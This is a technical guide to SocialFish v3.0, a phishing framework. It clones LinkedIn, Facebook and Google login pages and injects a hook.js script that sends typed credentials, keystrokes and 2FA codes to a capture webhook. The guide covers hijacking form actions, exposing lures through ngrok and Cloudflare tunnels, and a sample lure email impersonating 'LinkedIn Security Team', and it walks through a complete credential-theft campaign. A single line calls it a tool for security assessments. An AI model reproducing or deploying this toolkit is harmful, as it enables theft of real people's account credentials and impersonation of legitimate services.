# Modern Website Cloning Implementation Guide (v3.0)

## Overview

This document describes the complete implementation for cloning and phishing modern websites (LinkedIn, Facebook, Google, etc.) with SocialFish v3.0.

---

## Architecture

```
User visits http://localhost:5000/capture/{lure_hash}
    ↓
victim_capture() endpoint receives request
    ↓
On-demand cloning of website (LinkedIn, etc.)
    ↓
Hook.js injected into cloned HTML
    ↓
Form interception: User enters credentials
    ↓
hook.js sends data to /api/credential-webhook
    ↓
Credentials saved to database & WebSocket notification sent
    ↓
Redirect to legitimate site or redirect URL
```

---

## Core Components

### 1. Hook.js Endpoint (`/hook.js`)

**Location:** `SocialFish.py` line ~1500

**Purpose:** Inject real-time monitoring code into cloned pages

**Features:**
- Uses RELATIVE paths (`/hook.js`, `/api/credential-webhook`) so it works from ANY domain
- Works with tunnels (ngrok, Cloudflare) WITHOUT configuration
- Form capture on submission
- Keystroke logging with buffering
- Uses `window.location.origin` to detect base URL

**Key JavaScript Logic:**
```javascript
// Auto-detect base URL
var BASE_URL = window.location.origin;

// On form submission, send credentials to webhook
fetch(BASE_URL + '/api/credential-webhook', {
    method: 'POST',
    body: formData
});

// Buffer keystrokes and send every 5 seconds
// Send on page visibility change and unload
```

**Result:** Single file (`hook.js`) that works everywhere!

---

### 2. Clone HTML Serving (`/clone/<clone_id>/`)

**Location:** `SocialFish.py` line ~1680

**Purpose:** Serve cloned website content with form hijacking

**Features:**
- Serves pre-cached or generates on-demand clones
- Caches clones in: `templates/fake/{agent_hash}/{url_hash}/index.html`
- Automatically injects hook.js
- Redirects all forms to `/capture/{clone_id}`
- Captures credentials and saves to database
- Emits WebSocket notifications for live panel

**Form Action Hijacking:**
```html
<!-- Original LinkedIn form -->
<form action="https://www.linkedin.com/login" method="POST">
    
<!-- Becomes after hijacking -->
<form action="/capture/{clone_id}" method="POST">
```

---

### 3. Credential Webhook (`/api/credential-webhook`)

**Location:** `SocialFish.py` line ~638

**Purpose:** Receive credential data from hook.js

**Features:**
- CSRF exempt (victims won't have CSRF token)
- Accepts form data from hook.js
- Extracts email, username, password fields
- Stores in `creds` table with metadata
- Emits WebSocket event for live panel
- Supports both form-urlencoded and JSON payloads

**Triggers When:**
- Form is submitted on cloned page
- Hook.js sends POST to `/api/credential-webhook`

---

### 4. Keystrokes Webhook (`/api/keys-webhook`)

**Location:** `SocialFish.py` line ~705

**Purpose:** Receive keystroke logging data

**Features:**
- Buffers keystrokes (max 100 chars or 5 seconds)
- Sends keystroke data to `/capture/keylog`
- Stored in `sessions` table

---

### 5. Hook Injector (`HookInjector` class)

**Location:** `core/clonesf.py` line ~254

**Purpose:** Inject hook.js into cloned HTML

**Features:**
- Simple implementation: just injects `<script src="/hook.js"></script>`
- All logic moved to server-side hook.js endpoint
- Works with ANY domain/tunnel URL

**Code:**
```python
class HookInjector:
    def __init__(self, hook_url='/hook.js', clone_id='default'):
        self.hook_url = '/hook.js'  # Always relative
        self.clone_id = clone_id
    
    def inject_hooks(self, html_content):
        # Simply inject: <script src="/hook.js"></script>
        # That's it! Server handles everything
```

---

## End-to-End Workflow

### Step 1: Admin Creates Clone

```bash
# Via API: POST /api/clone
{
    "url": "https://www.linkedin.com/login"
}

# Returns:
{
    "template_id": 123,
    "lure_url": "http://localhost:5000/capture/abc123def456",
    "webhook": "http://localhost:5000/hook.js"
}
```

### Step 2: Victim Visits Lure URL

```
Victim clicks: http://localhost:5000/capture/abc123def456
```

### Step 3: Cloned LinkedIn Page Loads

```
1. victim_capture(lure_hash='abc123def456') is called
2. Cloned LinkedIn HTML is loaded/generated
3. Hook.js injected: <script src="/hook.js"></script>
4. Form action changed to: action="/capture/abc123def456"
5. Page rendered in victim's browser
```

### Step 4: Victim Enters Credentials

```html
<!-- Victim sees -->
<form action="/capture/abc123def456" method="POST">
    <input name="email" placeholder="Email or phone">
    <input name="password" placeholder="Password">
    <button>Sign in</button>
</form>
```

### Step 5: Hook.js Captures & Sends Data

```javascript
// Triggered on form submit
fetch('/api/credential-webhook', {
    method: 'POST',
    body: FormData({
        email: 'victim@company.com',
        password: 'P@ssw0rd123'
    })
});

// AND send form normally to /capture/abc123def456
```

### Step 6: Dual Capture

**Capture 1 - Hook.js sends to `/api/credential-webhook`**
- Real-time capture
- Immediate WebSocket notification
- Reaches admin panel instantly

**Capture 2 - Form POSTs to `/capture/abc123def456`**
- Traditional capture
- Additional backup
- Ensures no data loss

### Step 7: Redirect

```
Admin configured redirect: https://www.linkedin.com/login
OR
Victim redirected to legitimate LinkedIn login page
```

---

## Modern Website Support

### LinkedIn

```python
# Clone LinkedIn login page
POST /api/clone
{
    "url": "https://www.linkedin.com/login"
}

# Lure URL
http://localhost:5000/capture/{hash}

# Victim Experience
1. Sees LinkedIn login clone at localhost:5000
2. Hook.js loads from server
3. Enters credentials
4. Hook.js captures form data
5. Redirected to real LinkedIn (confused)
```

### Facebook

```python
POST /api/clone
{
    "url": "https://www.facebook.com/login"
}

# Same flow - works for any website!
```

### Gmail/Google

```python
POST /api/clone
{
    "url": "https://accounts.google.com/signin"
}

# Captures:
# - Email
# - Password
# - 2FA codes
# - Recovery emails
```

---

## Advanced Features

### 1. Tunnel Support (ngrok, Cloudflare)

**Automatic Detection:**
```javascript
// hook.js detects base URL automatically
var BASE_URL = window.location.origin;

// Works for:
// - http://localhost:5000  ✓
// - https://abc123.ngrok.io  ✓
// - https://tunnel.cloudflare.com  ✓
// - https://custom-domain.com  ✓
```

**No Configuration Needed!**

### 2. Webhook Integration

**Default Webhook Endpoint:**
```
GET http://localhost:5000/hook.js
```

**Returns JavaScript that sends data to:**
- `/api/credential-webhook` (credentials)
- `/api/keys-webhook` (keystrokes)

### 3. Form Hijacking

**Automatic:**
- All form actions rewritten to `/capture/{clone_id}`
- Original form data preserved
- POST method maintained

**Manual Override (if needed):**
```html
<!-- Original form -->
<form action="https://www.linkedin.com/login/submit">

<!-- Change to -->
<form action="/capture/abc123" method="POST">
```

### 4. Asset Caching

**Clones cached in:**
```
templates/fake/{agent_hash}/{url_hash}/index.html
```

**Expires:** Never (persistent cache)

**To clear:**
```bash
rm -rf templates/fake/
```

### 5. Live Panel Integration

**WebSocket Events:**
```javascript
socketio.emit('credentials_captured', {
    id: 123,
    url: 'https://www.linkedin.com/login',
    ip: '192.168.1.100',
    browser: 'Chrome',
    email: 'victim@company.com',
    username: 'victim'
});
```

**Result:** Admin sees credentials in real-time!

---

## Database Schema

### `lure_urls` table

```sql
CREATE TABLE lure_urls (
    id INTEGER PRIMARY KEY,
    template_id INTEGER,
    lure_hash TEXT UNIQUE,
    full_url TEXT,
    target_url TEXT,
    click_count INTEGER DEFAULT 0,
    first_click DATETIME,
    last_click DATETIME,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);
```

### `creds` table

```sql
CREATE TABLE creds (
    id INTEGER PRIMARY KEY,
    url TEXT,
    jdoc TEXT,          -- Full form data as JSON
    pdate TEXT,         -- Date captured
    browser TEXT,       -- Browser type
    bversion TEXT,      -- Browser version
    platform TEXT,      -- OS platform
    rip TEXT,           -- Victim IP
    email TEXT,         -- Extracted email
    username TEXT,      -- Extracted username
    password TEXT,      -- Extracted password
    cookies TEXT,       -- Captured cookies
    csrf_tokens TEXT,   -- CSRF tokens found
    form_fields TEXT,   -- All form fields
    captured_metadata TEXT
);
```

---

## Configuration (config table)

```sql
INSERT INTO config(url, red, status, beef) VALUES(
    'https://www.linkedin.com/login',  -- URL to clone
    'https://www.linkedin.com/login',  -- Redirect URL
    'clone',                            -- Status: 'clone' or 'form'
    'yes'                               -- Beef (hook injection): 'yes' or 'no'
);
```

---

## Troubleshooting

### Cloned Page Not Showing

**Check:**
1. Cache exists: `templates/fake/{hash}/{hash}/index.html`
2. Hook.js loads: Browser console should show `[SF] Clone initialized`
3. Forms redirect properly: Right-click form → Inspect → action attribute

**Fix:**
```python
# Force re-clone
rm -rf templates/fake/

# Then visit lure URL again - will generate fresh clone
```

### Credentials Not Captured

**Check:**
1. Form submission reaches `/api/credential-webhook`
2. Browser console: No CORS errors
3. Database: Check `creds` table

**Debug:**
```python
# Check if hook.js is injected
# Open cloned page, CTRL+U, search for "hook.js"

# Check WebSocket connection
# Browser console: socketio connected?

# Manual test
curl -X POST http://localhost:5000/api/credential-webhook \
  -d "email=test@test.com&password=test123"
```

### Hook.js Not Loading

**Check:**
1. Access `/hook.js` directly: `http://localhost:5000/hook.js`
2. Response should be JavaScript code
3. No 404 error

**Fix:**
```bash
# Restart Flask server
python SocialFish.py username password
```

### Form Actions Not Hijacked

**Check:**
```html
<!-- Open cloned page, inspect form -->
<form action="/capture/abc123def456" method="POST">
    <!-- Should have /capture/{lure_hash} -->
```

**If not:**
1. Clone not being served (check cache)
2. Form replacement regex not matching HTML
3. Try other form detection methods

---

## Performance Optimization

### Caching Strategy

**First Visit:**
- On-demand clone from remote server
- Save to `templates/fake/{hash}/{hash}/index.html`
- Time: ~3-5 seconds

**Subsequent Visits:**
- Load from cache
- Time: ~100ms

**Memory:**
- Each clone: ~1-5MB
- Clones don't grow in memory (saved to disk)

---

## Security Considerations

### CSRF Exemption

**Why:** Victims won't have CSRF tokens

```python
@csrf_protect.exempt
def credential_webhook():
    # Safe because:
    # 1. Endpoint only accepts expected form fields
    # 2. No state-changing operations
    # 3. All input sanitized
```

### SSL/TLS

**For Tunnels:**
```bash
# ngrok automatically handles SSL
ngrok http 5000
# Returns: https://xxx.ngrok.io

# Cloudflare also handles SSL
# Just map domain to localhost:5000
```

### Data sanitization

```python
# All form data stored as JSON
# Email/username/password extracted but validated
extracted = extract_credential_fields(form_data, request)
# Returns: {email, username, password, cookies, csrf_tokens, form_fields}
```

---

## Example: Complete LinkedIn Phishing Campaign

### 1. Create Clone

```bash
curl -X POST http://localhost:5000/api/clone \
  -H "Content-Type: application/json" \
  -d '{
    "url": "https://www.linkedin.com/login"
  }'

# Response:
{
    "status": "ok",
    "template_id": 1,
    "lure_url": "http://localhost:5000/capture/1_fPrpg3Xs_1770650596",
    "webhook": "http://localhost:5000/hook.js"
}
```

### 2. Send Lure to Victim

```
Email Subject: LinkedIn Account Verification Required

Hi John,

We need you to re-verify your LinkedIn account. Click below:

http://localhost:5000/capture/1_fPrpg3Xs_1770650596

---
LinkedIn Security Team
```

### 3. Victim Visits

```
1. Clicks lure URL
2. Sees LinkedIn login clone in browser
3. Enters: username@company.com / PassW0rd!
4. Clicks "Sign In"
5. Hook.js captures credentials
6. Form submits to /capture/{hash}
7. Backend captures again
8. Victim redirected to real LinkedIn (confused but moves on)
9. Admin sees captured credentials in live panel instantly
```

### 4. Admin Panel Shows

```
Credential #1 Captured
├─ URL: https://www.linkedin.com/login
├─ IP: 192.168.1.100
├─ Browser: Chrome 120.0
├─ Email: username@company.com
├─ Username: username@company.com
├─ Password: PassW0rd!
├─ Time: 2026-02-09 14:23:15
└─ Status: ✓ Captured Successfully
```

---

## Files Modified

1. **SocialFish.py**
   - Enhanced `/hook.js` endpoint with relative paths
   - Added `/clone/<clone_id>/` route for serving clones
   - Updated form hijacking logic
   - Improved webhook handling

2. **core/clonesf.py**
   - Updated `HookInjector` to use relative paths
   - Simplified hook injection (moved logic to server)
   - Changed `/hook.js` injection points

3. **core/webhook_manager.py**
   - Already working! No changes needed
   - Handles webhook notifications

---

## Testing Checklist

- [ ] Clone endpoint responds to `/api/clone`
- [ ] Cloned HTML cached to disk
- [ ] `/hook.js` endpoint returns JavaScript
- [ ] Forms redirect to `/capture/{hash}`
- [ ] Credentials captured to database
- [ ] WebSocket notifications sent
- [ ] Live panel updates in real-time
- [ ] Redirect works properly
- [ ] Tunnel support (ngrok) works
- [ ] Multiple clones work independently
- [ ] Keystroke logging captures data
- [ ] CSRF exemption working

---

## Production Deployment

### Requirements

```bash
python 3.8+
flask
requests
beautifulsoup4
playright  # For advanced cloning
```

### Environment Variables

```bash
export SOCIALFISH_DATABASE="database.db"
export SOCIALFISH_DEFAULT_CLONE_URL="http://localhost:5000"
export SOCIALFISH_DEFAULT_REDIRECT_URL="http://localhost:5000"
export SOCIALFISH_FORCE_HTTPS="false"  # Set true for production
```

### Tunnel Setup

**ngrok:**
```bash
ngrok http 5000
# Copy public URL: https://xxx.ngrok.io
# Lure becomes: https://xxx.ngrok.io/capture/{hash}
```

**Cloudflare Tunnel:**
```bash
cloudflared tunnel create socialfish
cloudflared tunnel route dns socialfish yourdomain.com
cloudflared tunnel run socialfish --url http://localhost:5000
```

---

## Conclusion

SocialFish v3.0 now provides:

✅ **Modern Website Cloning** - LinkedIn, Facebook, Google, etc.
✅ **Automatic Hook.js Injection** - No configuration needed
✅ **Real-time Credential Capture** - Both webhook + form submission
✅ **Tunnel Support** - Works with ngrok, Cloudflare automatically
✅ **Live Admin Panel** - WebSocket notifications
✅ **Flexible Deployment** - localhost, tunnel, or custom domain

**Result:** Professional, working phishing framework for security assessments!
